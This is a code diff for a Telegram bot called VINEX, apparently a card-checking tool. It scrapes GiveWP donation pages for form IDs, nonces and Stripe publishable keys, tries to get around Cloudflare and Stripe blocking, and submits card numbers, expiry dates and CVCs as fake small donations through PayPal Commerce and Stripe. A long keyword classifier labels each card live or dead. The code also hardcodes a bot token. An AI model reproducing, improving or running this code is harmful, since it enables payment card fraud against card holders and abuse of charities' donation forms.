@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # ═══════════════════════════════════════════════════════════════════════════════
-#   VINEX v23 FINAL — Complete Edition
-#   Parallel + Multi-Gateway + 22-Pattern Form-ID + Stripe Proxy + CF + Ultra Classifier
+#   VINEX v23.1 — Universal Multi-Gateway + 8 Parallel Workers + Full PayPal
 # ═══════════════════════════════════════════════════════════════════════════════
 import telebot
 from telebot import types
@@ -31,9 +30,7 @@ except:
 telebot.apihelper.CONNECT_TIMEOUT = 30
 telebot.apihelper.READ_TIMEOUT = 180
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#   CONFIG
-# ═══════════════════════════════════════════════════════════════════════════════
+# ═══════════ CONFIG ═══════════
 TOKEN = os.getenv('BOT_TOKEN', '8689698569:AAFJjLfJ9ztJg9QNJugf8xJbb0Ernow8vG8')
 OWNER_ID = int(os.getenv('OWNER_ID', '6843321125'))
 ADMINS = {str(OWNER_ID)}
@@ -73,9 +70,7 @@ logging.basicConfig(
 log = logging.getLogger('vinex')
 bot = telebot.TeleBot(TOKEN, parse_mode='HTML')
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#   FONTS
-# ═══════════════════════════════════════════════════════════════════════════════
+# ═══════════ FONTS ═══════════
 def _bold(s):
     r = []
     for c in s:
@@ -99,9 +94,6 @@ def _sb(s):
 B = _bold
 SB = _sb
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#   EMOJI PACK
-# ═══════════════════════════════════════════════════════════════════════════════
 VINEX_CE = {
     'warn': ('5420323339723881652', '⚠️'), 'globe': ('5447410659077661506', '🌐'),
     'play': ('5264919878082509254', '▶️'), 'ban': ('5240241223632954241', '🚫'),
@@ -148,9 +140,7 @@ def playful(kind):
             'fun': ['😎','🤙','👑','🦾','😏']}
     return random.choice(pool.get(kind, ['•']))
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#   STATE
-# ═══════════════════════════════════════════════════════════════════════════════
+# ═══════════ STATE ═══════════
 waiting_users = {}; reply_mode = {}; mass_active = {}; mass_pause = {}
 user_last_paypal = defaultdict(float); user_last_mass = defaultdict(float)
 link_cooldowns = {}
@@ -160,9 +150,6 @@ for _f in (USERS_FILE, BLOCK_FILE):
         if not os.path.exists(_f): open(_f, 'w', encoding='utf-8').close()
     except: pass
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#   FILE HELPERS
-# ═══════════════════════════════════════════════════════════════════════════════
 def save_user(uid):
     try:
         uids = open(USERS_FILE, 'r', encoding='utf-8').read().splitlines()
@@ -211,9 +198,6 @@ def cleanup_old_files():
                 if os.path.isfile(p) and os.path.getmtime(p) < cutoff: os.remove(p)
     except: pass
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#   URL + DEDUP
-# ═══════════════════════════════════════════════════════════════════════════════
 _URL_RE = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$')
 
 def safe_url(link):
@@ -242,9 +226,7 @@ def normalize_url_key(url):
         return f'{host}{path}?{q}' if q else f'{host}{path}'
     except: return str(url).lower().strip()
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#   TELEGRAM HELPERS
-# ═══════════════════════════════════════════════════════════════════════════════
+# ═══════════ TELEGRAM HELPERS ═══════════
 def retry_call(func, *args, retries=4, delays=(2,4,8,16), **kw):
     last = None
     for i in range(retries):
@@ -338,9 +320,7 @@ def send_dice(cid, emoji='🎲'):
     try: return bot.send_dice(cid, emoji=emoji)
     except: return None
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#   RESPONSE EXTRACTOR
-# ═══════════════════════════════════════════════════════════════════════════════
+# ═══════════ EXTRACTOR ═══════════
 def extract_response_text(body):
     if not body: return ''
     s = str(body).strip()
@@ -386,9 +366,6 @@ def extract_response_text(body):
         if r: return r
     return s[:500]
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#   OPTION FILTER
-# ═══════════════════════════════════════════════════════════════════════════════
 _JUNK = ['give-','screen-reader','give-label','give-required','give-where','give_price','give-form-']
 _JUNK_E = {'true','false','none','null','selected','disabled','required'}
 def is_valid_option(opt):
@@ -402,15 +379,21 @@ def is_valid_option(opt):
     if len(o) > 60 or o.startswith(('{','[','<')): return False
     return True
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#   ULTRA CLASSIFIER v3
-# ═══════════════════════════════════════════════════════════════════════════════
+# ═══════════ CLASSIFIER v3 ═══════════
 RETRY_ON_AUTH = ['AUTHENTICATION_FAILURE','AUTHENTICATION_FAILED','INVALID_TOKEN',
                   'TOKEN_EXPIRED','NOT_AUTHORIZED','INVALID_CLIENT','INVALID_NONCE',
                   'SESSION_EXPIRED','CSRF_TOKEN_MISMATCH']
 
+LIVE_PENDING_KEYWORDS = [
+    'PayPal orders are captured when',
+    'Payer has not yet approved',
+    'redirect the payer',
+    'provide a valid payment_source',
+    'PAYER_ACTION_REQUIRED',
+    'ORDER_NOT_APPROVED',
+]
+
 CARD_DECLINES = [
-    # PayPal
     'INSTRUMENT_DECLINED','PAYER_CANNOT_PAY','ORDER_NOT_APPROVED','Payer has not yet approved',
     'Payer cannot pay','PAYMENT_DENIED','DO_NOT_HONOR','INSUFFICIENT_FUNDS','CVV_FAILURE',
     'CVV2_FAILURE','INVALID_OR_RESTRICTED','SUSPECTED_FRAUD','ACCOUNT_CLOSED','EXPIRED_CARD',
@@ -424,7 +407,6 @@ CARD_DECLINES = [
     'INVALID_CARD_VERIFICATION_VALUE','INVALID_TRANSACTION','DUPLICATE_TRANSACTION',
     'CARD_CLOSED','UNAUTHORIZED_USER','AVS_FAILURE','SOFT_AVS','INCORRECT_PIN_REENTER',
     'INVALID_PIN','ISSUER_NOT_AVAILABLE_NOT_RETRIABLE','ACCOUNT_NOT_ON_FILE','INVALID_ACCOUNT',
-    # Stripe
     'Your card has expired','Your card was declined',"Your card's expiration",
     "Your card's security code is incorrect","Your card number is incorrect",
     'card_expired','expired_card','card_declined','incorrect_number','incorrect_cvc',
@@ -435,20 +417,16 @@ CARD_DECLINES = [
     'withdrawal_count_limit_exceeded','authentication_required','card_velocity_exceeded',
     'expired','new_account_information_available','payment_intent_authentication_failure',
     'payment_method_unactivated','stripe_error','stripe_declined','payment_failed',
-    # GiveWP / Gateway codes
     'REJECT64','REJECT_64','REJECT-64','reject64','REJECT_42','reject_42','REJECT_05','reject_05',
     'Reject05','Reject41','Reject43','Reject51','Reject54','Reject57','Reject62','Reject65',
     'Reject75','Reject78','Reject82','Reject83','Reject85','Reject91',
     'insufficient_funds','declined_by_issuer','declined_by_gateway','transaction_declined',
     'payment_declined','charge_declined','card_rejected','payment_rejected','transaction_rejected',
     'not_permitted','not_allowed','unauthorized','declined','rejected',
-    # Braintree
     'Do Not Honor','Insufficient Funds','Expired Card','Card Declined',
     'Processor Declined','Gateway Rejected','Fraud',
-    # Authorize.net
     'This transaction has been declined','The credit card has expired',
     'The credit card number is invalid',
-    # Generic
     'REJECTED','DECLINED','DENIED','REFUSED','EXPIRED','INVALID_CARD','INVALID_NUMBER',
     'INVALID_EXPIRY','INVALID_CVV','INVALID_CVC','REJECT','DECLINE','DENY','REFUSE',
     'BLOCKED','SUSPENDED','INACTIVE','CHARGEBACK','FRAUD','STOLEN','LOST',
@@ -468,7 +446,10 @@ INFRA_FAILS = ['HTTP_403','HTTP_404','HTTP_500','HTTP_502','HTTP_503',
                'GATEWAY_NOT_ENABLED','CLOUDFLARE_FAIL','TURNSTILE_FAIL',
                'STRIPE_ALL_FAILED','STRIPE_NO_RESPONSE','STRIPE_TOKEN_EXC',
                'STRIPE_BLOCKED','SITE_AJAX_FAILED','SITE_AJAX_NO_RESPONSE',
-               'NOT_GIVEWP','NO_GATEWAY','NO_FORM','NO_NONCE','STRIPE_NO_TOKEN']
+               'NOT_GIVEWP','NO_GATEWAY','NO_FORM','NO_NONCE','STRIPE_NO_TOKEN',
+               'STRIPE_SKIP_NO_PK','PAYFLOW_FAILED','PAYFLOW_NO_RESPONSE',
+               'PP_PRO_FAILED','PP_PRO_NO_RESPONSE','PAYPAL_STANDARD_FAILED',
+               'DISPATCH_NO_RESPONSE','RAW_ALL_FAILED','RAW_NO_RESPONSE']
 
 LIVE_ZERO_FIELDS = ['response_code','responseCode','result_code','resultCode',
                     'auth_code','authCode','authorization_code','status_code',
@@ -476,8 +457,7 @@ LIVE_ZERO_FIELDS = ['response_code','responseCode','result_code','resultCode',
 
 def is_card_decline(resp):
     if not resp: return False
-    s = str(resp)
-    up = s.upper()
+    s = str(resp); up = s.upper()
     for p in CARD_DECLINES:
         if p.upper() in up: return True
     for sep in (':','=','|',';','/','\n','-','_'):
@@ -489,7 +469,6 @@ def is_card_decline(resp):
                     pu = p.upper()
                     if pc == pu: return True
                     if len(pu) > 5 and pu in pc: return True
-    # Smart "0" detection
     try:
         j = json.loads(s)
         if isinstance(j, dict):
@@ -520,6 +499,13 @@ def is_card_decline(resp):
             if kw in up: return True
     return False
 
+def is_live_pending(r):
+    if not r: return False
+    up = str(r).upper()
+    for kw in LIVE_PENDING_KEYWORDS:
+        if kw.upper() in up: return True
+    return False
+
 def is_infra_failure(r):
     if not r: return False
     up = str(r).upper()
@@ -535,6 +521,7 @@ def is_live_response(r):
     up = str(r).upper()
     if 'CHARGE' in up: return True
     if is_card_decline(up): return True
+    if is_live_pending(up): return True
     if is_infra_failure(up): return False
     if is_auth_failure(up): return False
     return False
@@ -544,6 +531,7 @@ def is_dead_response(r):
     up = str(r).upper()
     if 'CHARGE' in up: return False
     if is_card_decline(up): return False
+    if is_live_pending(up): return False
     return is_infra_failure(up) or is_auth_failure(up)
 
 PRIORITY = [
@@ -566,17 +554,14 @@ def score_result(r):
 
 def normalize_result(r):
     if not r: return 'DECLINED'
-    s = str(r)
-    up = s.upper()
+    s = str(r); up = s.upper()
     if 'ORDER_NOT_APPROVED' in up or 'PAYER_CANNOT_PAY' in up \
        or 'Payer has not yet approved' in s or 'Payer cannot pay' in s:
         return 'Payer cannot pay for this transaction.'
     raw = extract_response_text(s) or s
     return raw[:300]
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#   DECODER ENGINE
-# ═══════════════════════════════════════════════════════════════════════════════
+# ═══════════ DECODER ENGINE ═══════════
 class DecoderEngine:
     @staticmethod
     def b64(s):
@@ -643,9 +628,7 @@ class DecoderEngine:
             frontier = new_f[:20]
         return results
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#   EXTRACTOR ENGINE (15 passes)
-# ═══════════════════════════════════════════════════════════════════════════════
+# ═══════════ EXTRACTOR ENGINE ═══════════
 class ExtractorEngine:
     @staticmethod
     def from_comments(h): return [m.group(1) for m in re.finditer(r'<!--(.*?)-->', h, re.DOTALL)]
@@ -715,9 +698,7 @@ class ExtractorEngine:
             except: continue
         return out
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#   VINEX TESTER v23
-# ═══════════════════════════════════════════════════════════════════════════════
+# ═══════════ VINEX TESTER v23.1 ═══════════
 FIRST_NAMES = ['James','John','Robert','Michael','William','David']
 LAST_NAMES = ['Smith','Johnson','Williams','Brown','Jones','Miller']
 
@@ -764,6 +745,10 @@ class VinexTester:
         self.card_field_names = {}
         self.stripe_blocked = False
         self.is_givewp = False
+        self.paypal_modes = []
+        # ✅ v23.1
+        self.response_gateway = None
+        self._current_gateway_name = None
 
     def _log(self, m):
         try: self.diagnostics.append(f'{time.time():.2f} {m}')
@@ -807,8 +792,7 @@ class VinexTester:
             'Sec-Fetch-Dest': 'empty',
             'Sec-Fetch-Mode': 'cors' if ajax else 'navigate',
             'Sec-Fetch-Site': 'same-origin' if ajax else 'none',
-            'Cache-Control': 'no-cache',
-            'DNT': '1',
+            'Cache-Control': 'no-cache', 'DNT': '1',
         }
         if ajax: headers['X-Requested-With'] = 'XMLHttpRequest'
         if extra: headers.update(extra)
@@ -854,8 +838,7 @@ class VinexTester:
     def _warmup_session(self):
         try:
             if self._warmed: return True
-            try:
-                self.r.get(self.page_url, timeout=10, headers={'referer': f'https://{self.url}/'})
+            try: self.r.get(self.page_url, timeout=10, headers={'referer': f'https://{self.url}/'})
             except: pass
             self._warmed = True
             return True
@@ -865,11 +848,8 @@ class VinexTester:
         try:
             if self._baked: return True
             if self.id_form2 and self.nonce and self.au:
-                self._baked = True
-                return True
-            try:
-                self.r.get(self.page_url, timeout=8,
-                           headers=self._get_browser_headers(ajax=False))
+                self._baked = True; return True
+            try: self.r.get(self.page_url, timeout=8, headers=self._get_browser_headers(ajax=False))
             except: pass
             if self.ajax_url and self.id_form2 and not self.nonce:
                 try:
@@ -894,8 +874,7 @@ class VinexTester:
 
     def _load_iframes(self):
         try:
-            if not self.page_html: return
-            if self.id_form2: return
+            if not self.page_html or self.id_form2: return
             pat = r'<iframe[^>]*src=["\']([^"\']*(?:give|donation|form|checkout|pay|stripe)[^"\']*)["\']'
             for m in re.finditer(pat, self.page_html, re.I):
                 try:
@@ -908,8 +887,7 @@ class VinexTester:
 
     def _load_all_js(self):
         try:
-            if not self.page_html: return
-            if self.id_form2 and self.au: return
+            if not self.page_html or (self.id_form2 and self.au): return
             js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', self.page_html)
             prio = [u for u in js_urls if any(k in u.lower() for k in
                     ('give','donation','paypal','commerce','token','client','stripe','payment','checkout'))]
@@ -924,15 +902,13 @@ class VinexTester:
         except: pass
 
     def _find_form_id_comprehensive(self):
-        """v23: 22 patterns + AJAX + wp-json."""
         try:
             c = self.all_content or ''
             patterns = [
                 r'name=["\']give-form-id["\'][^>]*value=["\'](\d+)["\']',
                 r'"give-form-id"\s*:\s*"?(\d+)"?',
                 r'data-form-id=["\'](\d+)["\']',
-                r'give-form-(\d+)',
-                r'give_form_(\d+)',
+                r'give-form-(\d+)', r'give_form_(\d+)',
                 r'give-form-id["\']?\s*[:=]\s*["\']?(\d+)',
                 r'data-give-form-id=["\'](\d+)["\']',
                 r'id=["\']give-form-(\d+)["\']',
@@ -956,8 +932,7 @@ class VinexTester:
                 if m:
                     fid = m.group(1)
                     try:
-                        if 100 <= int(fid) <= 9999999:
-                            return fid
+                        if 100 <= int(fid) <= 9999999: return fid
                     except: pass
             if self.ajax_url:
                 for action in ('give_get_forms', 'give_get_form_by_id', 'get_give_form'):
@@ -1017,7 +992,6 @@ class VinexTester:
             for p in [r'name="give-currency"\s+value="([A-Za-z]{3})"', r'"give-currency"\s*:\s*"([A-Za-z]{3})"', r'"currency"\s*:\s*"([A-Za-z]{3})"', r'data-currency=["\']([A-Za-z]{3})["\']']:
                 m = re.search(p, c, re.I)
                 if m: self.currency = m.group(1).upper(); break
-
             self.price_levels = []; seen = set()
             def _add(pid, amt):
                 try:
@@ -1029,19 +1003,7 @@ class VinexTester:
             for m in re.finditer(r'data-price-id=["\']([^"\']+)["\'][^>]*?data-price=["\']([\d.]+)["\']', c, re.I): _add(m.group(1), m.group(2))
             for m in re.finditer(r'data-price=["\']([\d.]+)["\'][^>]*?data-price-id=["\']([^"\']+)["\']', c, re.I): _add(m.group(2), m.group(1))
             for m in re.finditer(r'<input[^>]*name=["\']give-price-id["\'][^>]*value=["\']([^"\']+)["\'][^>]*data-price=["\']([\d.]+)["\']', c, re.I): _add(m.group(1), m.group(2))
-            for m in re.finditer(r'<select[^>]*name=["\']give-price-id["\'][^>]*>(.*?)</select>', c, re.DOTALL | re.I):
-                inner = m.group(1)
-                for om in re.finditer(r'<option[^>]*value=["\']([^"\']+)["\'][^>]*data-price=["\']([\d.]+)["\']', inner): _add(om.group(1), om.group(2))
-                for om in re.finditer(r'<option[^>]*value=["\']([^"\']+)["\'][^>]*>([^<]*[\d.,]+[^<]*)</option>', inner):
-                    try:
-                        pm = re.search(r'[\d]+[.,]?[\d]*', om.group(2))
-                        if pm: _add(om.group(1), pm.group(0).replace(',', ''))
-                    except: pass
             self.price_levels = sorted(self.price_levels, key=lambda x: x[1])
-            for p in [r'<input[^>]*name=["\']give-price-id["\'][^>]*value=["\']([^"\']+)["\'][^>]*checked',
-                      r'<input[^>]*checked[^>]*name=["\']give-price-id["\'][^>]*value=["\']([^"\']+)["\']']:
-                m = re.search(p, c, re.I)
-                if m: self.current_price_id = m.group(1); break
             if 'admin-ajax.php' in c and not self.ajax_url:
                 self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
         except: pass
@@ -1078,19 +1040,14 @@ class VinexTester:
                     if nm and nm.group(1) not in self.form_fields:
                         self.form_fields[nm.group(1)] = {'type': m.group(1).lower(), 'required': 'required' in tag.lower(), 'options': []}
                 except: continue
-
-            # Detect card fields
-            all_input_names = []
-            for m in re.finditer(r'<input[^>]*name=["\']([^"\']+)["\']', c, re.I): all_input_names.append(m.group(1))
-            for m in re.finditer(r'<select[^>]*name=["\']([^"\']+)["\']', c, re.I): all_input_names.append(m.group(1))
-
+            all_names = []
+            for m in re.finditer(r'<input[^>]*name=["\']([^"\']+)["\']', c, re.I): all_names.append(m.group(1))
             NUM_KW = ['number','num','pan','cc','card']
             CVC_KW = ['cvc','cvv','csc','cvv2','cvc2','csc2','security','verification','cvn','card_verification','card_security','cvv_code','security_code','cvc_code']
             EXP_KW = ['exp','expiry','expiration','expire','valid_thru','valid_until','validity','expire_date','exp_date','expiry_date','expiration_date']
             EXP_MO_KW = ['exp_month','expmonth','exp_mo','exp_m','card_exp_month','expire_month','expiration_month']
             EXP_YR_KW = ['exp_year','expyear','exp_yr','exp_y','card_exp_year','expire_year','expiration_year']
             NAME_KW = ['cardholder','card_holder','card_name','cardname','ccname','cc_name','cc-name','name_on_card','account_name','holder_name','billing_name']
-
             def _classify(fl):
                 fl2 = fl.lower().replace('[','_').replace(']','_').replace('-','_')
                 if any(k in fl2 for k in ('give_','payment_mode','give_gateway','give_first','give_last','give_email','give_amount','billing_country','billing_state','billing_city','first_name','last_name','email','phone','company','comment')): return None
@@ -1103,9 +1060,8 @@ class VinexTester:
                 if any(k in fl2 for k in ('card','cc','pan')):
                     if any(k in fl2 for k in ('number','num','pan')): return 'num'
                 return None
-
             self.card_field_names = {}
-            for fname in all_input_names:
+            for fname in all_names:
                 cat = _classify(fname)
                 if cat: self.card_field_names[fname] = {'category': cat, 'original': fname.lower()}
             self.has_card_fields = len(self.card_field_names) > 0
@@ -1285,6 +1241,11 @@ class VinexTester:
                                           'authorize', 'square', 'mollie', 'razorpay',
                                           'paystack', 'flutterwave', 'adyen')):
                     self.all_card_modes.append(mode)
+            self.paypal_modes = []
+            for mode in self.enabled_modes:
+                ml = mode.lower()
+                if 'paypal' in ml or 'payflow' in ml or 'braintree' in ml:
+                    if mode not in self.paypal_modes: self.paypal_modes.append(mode)
         except: pass
 
     def _detect_gateway_type(self):
@@ -1297,7 +1258,7 @@ class VinexTester:
             for m in re.finditer(r'(pk_live_[A-Za-z0-9]{20,}|pk_test_[A-Za-z0-9]{20,})', c):
                 self.stripe_pk = m.group(1); self.has_stripe = True; break
             if not self.has_stripe:
-                for mk in ('js.stripe.com', 'give-stripe', 'give_stripe', 'stripe.elements', 'stripe.createToken', 'stripe.confirmCardPayment'):
+                for mk in ('js.stripe.com', 'give-stripe', 'give_stripe', 'stripe.elements', 'stripe.createToken'):
                     if mk in c: self.has_stripe = True; break
             if 'give_paypal_commerce' in c: self.has_paypal_commerce = True
             if 'paypal-commerce' in self.enabled_modes: self.has_paypal_commerce = True
@@ -1366,7 +1327,6 @@ class VinexTester:
         try:
             expiry_slash = f'{mm}/{yy}'
             expiry_slash_full = f'{mm}/20{yy}'
-            expiry_iso = f'20{yy}-{mm}'
             full_name = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
             year_full = f'20{yy}'
             for fname, info in self.card_field_names.items():
@@ -1392,23 +1352,22 @@ class VinexTester:
             self._deep_session_bake()
             if not self._fetch_page(): return False
             self.cf_detected = self._detect_cloudflare()
-            if self.cf_detected and self._solve_cloudflare():
-                self._fetch_page()
+            if self.cf_detected and self._solve_cloudflare(): self._fetch_page()
             self._extract_basic()
             self._extract_all_form_fields()
             if not self.id_form2:
                 fid = self._find_form_id_comprehensive()
                 if fid:
                     self.id_form2 = fid
-                    self._log(f'form_id via comprehensive: {fid}')
+                    self._log(f'form_id comprehensive: {fid}')
             self._extract_tokens_ultimate()
             self._find_stripe_pk_deep()
             if self.token_candidates and self._pick_valid_token(): self.auth_method = 'token'
             if not self.au:
-                self._load_iframes(); self._extract_basic(); self._extract_tokens_ultimate(); self._find_stripe_pk_deep()
+                self._load_iframes(); self._extract_basic(); self._extract_tokens_ultimate()
                 if self.token_candidates and self._pick_valid_token(): self.auth_method = 'token'
             if not self.au:
-                self._load_all_js(); self._extract_tokens_ultimate(); self._find_stripe_pk_deep()
+                self._load_all_js(); self._extract_tokens_ultimate()
                 if self.token_candidates and self._pick_valid_token(): self.auth_method = 'token'
             if not self.au:
                 if self._try_ajax_client_token() and self._pick_valid_token(): self.auth_method = 'ajax'
@@ -1417,7 +1376,6 @@ class VinexTester:
             if not self.id_form1 and self.id_form2: self.id_form1 = f'{self.id_form2}-1'
             if not self.ajax_url: self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
             self._detect_gateway_type()
-            # Detect GiveWP
             c_low = (self.all_content or '').lower()
             give_sigs = ['give-form', 'give_payment', 'givewp', 'give_stripe', 'give_paypal',
                          'give_donation', 'give_goal', 'give-embed-form']
@@ -1425,76 +1383,51 @@ class VinexTester:
             return True
         except: return False
 
-    def _build_amounts(self, thorough=False):
-        amounts = list(BASE_AMOUNTS)
-        try:
-            min_val = float(self.minimum)
-            if min_val > 5.00 and min_val <= 500:
-                m = f'{min_val:.2f}'
-                if m not in amounts: amounts.append(m)
-        except: pass
-        return amounts
-
     def _create_order(self, amt, pid, payment_mode='paypal-commerce', attempt=1, max_attempts=2):
         try:
             fd = {
-                'give-form-id-prefix': self.id_form1 or '',
-                'give-form-id': self.id_form2 or '',
-                'give-form-hash': self.nonce or '',
-                'give-amount': amt,
-                'give-currency': self.currency,
-                'payment-mode': payment_mode,
-                'give_first': random.choice(FIRST_NAMES),
-                'give_last': random.choice(LAST_NAMES),
-                'give_email': self.email,
-                'give-gateway': payment_mode,
-                'give_agree_to_terms': 'on',
-                'give_terms_agreement': 'on',
+                'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
+                'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
+                'payment-mode': payment_mode, 'give_first': random.choice(FIRST_NAMES),
+                'give_last': random.choice(LAST_NAMES), 'give_email': self.email,
+                'give-gateway': payment_mode, 'give_agree_to_terms': 'on', 'give_terms_agreement': 'on',
             }
             if pid is not None: fd['give-price-id'] = pid
             fd = self._autofill_required_fields(fd)
             da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
             he = {'content-type': da.content_type, 'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest',
-                  'referer': self.page_url, 'origin': f'https://{self.url}', 'accept': 'application/json, text/plain, */*'}
-            r3 = None; net_err = None
+                  'referer': self.page_url, 'origin': f'https://{self.url}'}
+            r3 = None
             for retry in range(2):
                 try:
                     r3 = self.r.post(self.ajax_url, params={'action': 'give_paypal_commerce_create_order'}, headers=he, data=da, timeout=20)
                     break
                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
-                    net_err = str(e)[:100]; time.sleep(1 + retry); continue
-                except Exception as e:
-                    net_err = str(e)[:100]; break
-            if r3 is None: return None, f'NETWORK: {net_err}'
+                    time.sleep(1 + retry); continue
+                except Exception as e: break
+            if r3 is None: return None, 'NETWORK_FAILED'
             body = r3.text or ''
             if r3.status_code != 200:
                 if r3.status_code in (401, 403):
-                    if attempt < max_attempts:
-                        self._refresh_nonce()
-                        return self._create_order(amt, pid, payment_mode, attempt + 1, max_attempts)
+                    if attempt < max_attempts: self._refresh_nonce(); return self._create_order(amt, pid, payment_mode, attempt+1, max_attempts)
                     return None, f'AUTH_REQUIRED: HTTP_{r3.status_code}'
-                if r3.status_code == 429:
-                    if attempt < max_attempts: time.sleep(5); return self._create_order(amt, pid, payment_mode, attempt + 1, max_attempts)
-                    return None, 'RATE_LIMITED'
-                if 'not enabled' in body.lower():
-                    return None, f'GATEWAY_NOT_ENABLED: {payment_mode}'
-                return None, f'HTTP_{r3.status_code}: {body[:120]}'
+                if 'not enabled' in body.lower(): return None, f'GATEWAY_NOT_ENABLED: {payment_mode}'
+                return None, f'HTTP_{r3.status_code}'
             try: j = r3.json()
             except:
-                if 'nonce' in body.lower():
-                    if attempt < max_attempts: self._refresh_nonce(); return self._create_order(amt, pid, payment_mode, attempt + 1, max_attempts)
-                return None, f'JSON_ERR: {body[:120]}'
+                if 'nonce' in body.lower() and attempt < max_attempts:
+                    self._refresh_nonce(); return self._create_order(amt, pid, payment_mode, attempt+1, max_attempts)
+                return None, 'JSON_ERR'
             if isinstance(j, dict) and j.get('success') and isinstance(j.get('data'), dict) and j['data'].get('id'):
                 return j['data']['id'], None
             real = extract_response_text(body)
-            if real and any(k in real.upper() for k in ('NONCE', 'CSRF', 'INVALID_FORM', 'TOKEN')):
-                if attempt < max_attempts: self._refresh_nonce(); return self._create_order(amt, pid, payment_mode, attempt + 1, max_attempts)
             return None, real or 'ORDER_CREATE_FAILED'
         except Exception as e:
-            return None, f'EXC_{type(e).__name__}: {str(e)[:100]}'
+            return None, f'EXC_{type(e).__name__}'
 
     def _attempt_charge(self, n, mm, yy, cvc, amt, pid="custom", payment_mode='paypal-commerce'):
         try:
+            self._current_gateway_name = 'paypal_commerce'
             self.donation = amt; expiry = f'20{yy}-{mm}'
             order_id, create_err = self._create_order(amt, pid, payment_mode=payment_mode)
             if not order_id:
@@ -1517,18 +1450,11 @@ class VinexTester:
                 if is_auth_failure(confirm_body): return 'AUTH_FAILURE_ON_CONFIRM', confirm_body
             try:
                 fd = {
-                    'give-form-id-prefix': self.id_form1 or '',
-                    'give-form-id': self.id_form2 or '',
-                    'give-form-hash': self.nonce or '',
-                    'give-amount': amt,
-                    'give-currency': self.currency,
-                    'payment-mode': payment_mode,
-                    'give-gateway': payment_mode,
-                    'give_first': random.choice(FIRST_NAMES),
-                    'give_last': random.choice(LAST_NAMES),
-                    'give_email': self.email,
-                    'give_agree_to_terms': 'on',
-                    'give_terms_agreement': 'on',
+                    'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
+                    'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
+                    'payment-mode': payment_mode, 'give_first': random.choice(FIRST_NAMES),
+                    'give_last': random.choice(LAST_NAMES), 'give_email': self.email,
+                    'give-gateway': payment_mode, 'give_agree_to_terms': 'on', 'give_terms_agreement': 'on',
                 }
                 if pid is not None: fd['give-price-id'] = pid
                 fd = self._autofill_required_fields(fd)
@@ -1546,15 +1472,77 @@ class VinexTester:
                 if confirm_body.strip(): return extract_response_text(confirm_body), confirm_body
                 return 'APPROVE_NO_RESPONSE', ''
             except Exception as e:
-                return None, f'APPROVE_EXC_{type(e).__name__}: {str(e)[:100]}'
+                return None, f'APPROVE_EXC_{type(e).__name__}'
         except Exception as e:
-            return None, f'FATAL_{type(e).__name__}: {str(e)[:120]}'
+            return None, f'FATAL_{type(e).__name__}'
+
+    def _attempt_stripe_charge(self, n, mm, yy, cvc, amt, pid=None, payment_mode='stripe'):
+        try:
+            self._current_gateway_name = 'stripe'
+            if not self.stripe_pk: return None, 'STRIPE_SKIP_NO_PK'
+            if self.stripe_blocked: return None, 'STRIPE_BLOCKED_SKIP'
+            # Try site AJAX (bypass block)
+            site_result, site_text = self._stripe_via_site_ajax(n, mm, yy, cvc, amt, pid=pid)
+            if site_result: return site_result, site_text
+            # Direct Stripe
+            browser_headers = self._get_browser_headers({'Content-Type': 'application/x-www-form-urlencoded', 'Stripe-Version': '2023-10-16', 'Sec-Fetch-Site': 'cross-site'})
+            pm = None; token = None
+            try:
+                r = self.r.post('https://api.stripe.com/v1/payment_methods', auth=(self.stripe_pk, ''), headers=browser_headers,
+                    data={'type': 'card', 'card[number]': n, 'card[exp_month]': str(mm), 'card[exp_year]': str(yy), 'card[cvc]': str(cvc)}, timeout=20)
+                if r.status_code == 200:
+                    try: pm = r.json().get('id')
+                    except: pass
+                else:
+                    err_body = (r.text or '').lower()
+                    if 'unsupported' in err_body or 'integration surface' in err_body:
+                        self.stripe_blocked = True; return None, 'STRIPE_BLOCKED'
+                    try:
+                        err = r.json().get('error', {}); msg = err.get('message', 'FAIL'); code = err.get('code', '')
+                        if code in ('card_declined','expired_card','insufficient_funds','incorrect_number','incorrect_cvc'):
+                            return f'{msg} ({code})', r.text
+                        if 'expired' in msg.lower(): return 'Your card has expired', r.text
+                    except: pass
+            except Exception as e: pass
+            if not pm:
+                try:
+                    r2 = self.r.post('https://api.stripe.com/v1/tokens', auth=(self.stripe_pk, ''), headers=browser_headers,
+                        data={'card[number]': n, 'card[exp_month]': str(mm), 'card[exp_year]': str(yy), 'card[cvc]': str(cvc)}, timeout=20)
+                    if r2.status_code == 200:
+                        try: token = r2.json().get('id')
+                        except: pass
+                except: pass
+            if not pm and not token:
+                return None, site_text or 'STRIPE_NO_TOKEN'
+            fd = {
+                'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
+                'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
+                'payment-mode': payment_mode, 'give_first': random.choice(FIRST_NAMES),
+                'give_last': random.choice(LAST_NAMES), 'give_email': self.email,
+                'give-gateway': payment_mode, 'give_agree_to_terms': 'on',
+            }
